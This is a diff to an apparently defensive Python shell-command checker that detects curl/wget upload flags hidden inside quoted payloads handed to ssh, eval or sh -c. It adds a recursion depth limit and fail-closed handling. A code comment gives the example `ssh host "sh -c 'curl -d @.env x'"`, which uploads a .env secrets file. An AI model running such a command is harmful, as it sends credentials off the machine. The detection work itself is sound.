@@ -1758,12 +1758,37 @@ def _is_shell_token_spliced_gateway_lifecycle(command: str) -> bool:
     return contains_gateway_lifecycle_command(command)
 
 
-def _upload_flag_owner_ranges(command: str) -> tuple[list[int], list[int]]:
+# A quoted payload handed to a launcher may itself quote another payload
+# (`ssh host "sh -c 'curl -d @.env x'"`). The recursion only ever re-walks a strictly shorter
+# string, so the bound keeps a pathological nesting from costing more than a few passes; at the
+# bound the whole quoted word counts as owned, which fails closed.
+_MAX_QUOTED_PAYLOAD_DEPTH = 4
+
+
+def _quoted_payload_owner_ranges(command: str, word_start: int, word_end: int,
+                                 depth: int) -> list[tuple[int, int]]:
+    """Owner ranges inside one quoted word that a launcher may re-parse as a command.
+    Only the payload's own command word can own an upload flag there: re-walking the dequoted text
+    keeps ``'… curl -d …'`` owned by curl while ``'php -d auto_prepend_file=…'`` (a PHP INI flag,
+    #159682) is owned by php, just as it already is when the same command is not quoted. Quoting
+    that cannot be stripped (escaped whitespace, ``$'…'``) or the depth bound keeps the whole
+    inside owned, so an unparsable payload still fails closed."""
+    quote = command[word_start]
+    if quote in "'\"" and word_end - word_start >= 2 and command[word_end - 1] == quote \
+            and depth < _MAX_QUOTED_PAYLOAD_DEPTH:
+        offset = word_start + 1
+        starts, ends = _upload_flag_owner_ranges(command[offset:word_end - 1], depth + 1)
+        return [(start + offset, end + offset) for start, end in zip(starts, ends)]
+    return [(word_start + 1, word_end)]
+
+
+def _upload_flag_owner_ranges(command: str, _depth: int = 0) -> tuple[list[int], list[int]]:
     """Merged ``(starts, ends)`` of the ranges where an upload flag may belong to curl/wget.
     ``awk -F``, ``cut -d`` and ``sort -t`` share the flag letters but take a delimiter and upload
     nothing. A range runs from a curl/wget word (``xargs curl``, ``ssh host curl``) or a word that
-    may expand to one to the end of its simple command, and covers the inside of a quoted word
-    (``eval "curl -d …"``, ``ssh host "curl …"``) that another program may re-parse as a command.
+    may expand to one to the end of its simple command; in a quoted word another program may
+    re-parse as a command (``eval "curl -d …"``, ``ssh host "…"``) it runs from the payload's own
+    curl/wget word to the end of that command inside the quotes.
     Built once per command, so many delimiter flags cost one parse instead of one parse each."""
     ranges = []
     for start, _, _ in _iter_shell_command_word_spans(command):
@@ -1781,7 +1806,7 @@ def _upload_flag_owner_ranges(command: str) -> tuple[list[int], list[int]]:
                 ranges.append((word_start, end))
                 break
             if any(ch.isspace() for ch in command[word_start:pos]):
-                ranges.append((word_start + 1, pos))
+                ranges.extend(_quoted_payload_owner_ranges(command, word_start, pos, _depth))
     starts: list[int] = []
     ends: list[int] = []
     for range_start, range_end in sorted(ranges):
@@ -1806,6 +1831,11 @@ def _word_may_run_curl_or_wget(word: str) -> bool:
     ``c${suffix}``): what it runs is unknown without executing the shell."""
     names = (os.path.basename(_deobfuscate_shell_word_for_detection(word)), re.split(r"[\\/]", word)[-1])
     if any(name.lower().removesuffix(".exe") in ("curl", "wget") for name in names):
+        return True
+    # `_join_escaped_word_chars` spells an escaped quote as `_`, so `ssh host "bash -c \"curl …\""`
+    # reaches this walk as the word `_curl`: the leading placeholder stands for a quote kept as data,
+    # not for part of a name, so the word may still run curl/wget (fail closed).
+    if any(name.startswith("_") and name[1:].lower().removesuffix(".exe") in ("curl", "wget") for name in names):
         return True
     # A glob in the name (``/usr/bin/cur[l]``, ``wge*``) may match curl/wget.
     if any(fnmatch.fnmatchcase(tool, name.lower()) for name in names if any(c in name for c in "*?[")
